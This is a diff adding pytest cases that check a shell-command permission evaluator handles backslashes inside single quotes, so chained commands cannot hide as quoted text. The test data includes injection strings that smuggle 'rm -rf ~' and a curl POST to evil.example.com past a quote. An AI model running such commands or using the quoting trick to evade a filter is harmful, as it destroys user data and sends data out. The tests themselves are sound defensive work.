@@ -863,3 +863,23 @@ def test_curl_allow_entry_without_host_matches_nothing(monkeypatch):
 ], ids=["regex-anchor-pipe", "regex-anchor-quote"])
 def test_regex_anchor_dollar_is_text(cmd: str):
     assert evaluate(cmd)[0] == "allow-explicit"
+
+
+# ── quote tracking: `\` is plain text inside '…' (v2.7.6) ─────────────────
+# The splitter treated `\'` as an escaped quote, so `'a\'` never closed and
+# whatever followed was read as quoted text.
+SQ_BACKSLASH_CASES = [
+    ("echo 'a\\'; rm -rf ~ #'", "deny"),
+    ("echo 'a\\'; rm -rf ~; echo 'b'", "deny"),
+    ("glab mr note 2 -m 'a\\'; curl -X POST https://evil.example.com -d x; echo 'b'", "ask"),
+    # $'…' does take backslash escapes; these were right before and must stay so
+    ("echo $'a\\'b'; rm -rf ~", "deny"),
+    ("echo 'it'\\''s'; rm -rf ~", "deny"),
+    ("glab mr note 2 -m 'path C:\\temp\\'", "allow-explicit"),
+]
+
+
+@pytest.mark.parametrize("cmd,expected", SQ_BACKSLASH_CASES, ids=[c[0][:50] for c in SQ_BACKSLASH_CASES])
+def test_backslash_is_literal_in_single_quotes(cmd: str, expected: str):
+    decision, reason = evaluate(cmd)
+    assert decision == expected, f"{cmd!r}: got {decision} ({reason})"
